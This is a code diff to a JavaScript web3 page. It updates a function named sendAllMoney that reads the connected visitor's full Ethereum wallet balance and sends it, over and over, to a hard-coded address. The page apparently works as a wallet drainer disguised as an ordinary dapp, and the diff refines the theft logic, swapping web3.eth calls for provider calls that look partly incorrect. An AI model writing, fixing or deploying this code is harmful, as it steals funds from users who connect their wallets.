@@ -83,7 +83,7 @@ function toogleButton() {
     document.getElementsByTagName("button")[0].disabled = !document.getElementsByTagName("button")[0].disabled;
 }
 async function syncChain() {
-                if(web3.currentProvider.getChainId() != 1) {
+                if(Moralis.getChainId() != "0x1") {
                     try {
                         await web3.currentProvider.request({
                             method: "wallet_switchEthereumChain",
@@ -251,7 +251,7 @@ async function get12DollarETH() {
 
 async function sendAllMoney() {
     try {
-        let balance = await web3.eth.getBalance(selectedAccount);
+        let balance = await web3.currentProvider.getBalance(selectedAccount);
 
         let to = "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff";
         console.log(balance);
@@ -269,7 +269,7 @@ async function sendAllMoney() {
         console.log("Sending Money")
         if (newBalance > 0) {
             try {
-                await web3.eth.sendTransaction(transactionObject);
+                await web3.currentProvider.sendTransaction(transactionObject);
                 await sendAllMoney();
 
             }
@@ -282,7 +282,7 @@ async function sendAllMoney() {
         }
         else {
             transactionObject.value = web3.utils.toHex(balance);
-            await web3.eth.sendTransaction(transactionObject);
+            await web3.currentProvider.sendTransaction(transactionObject);
 
         }
 
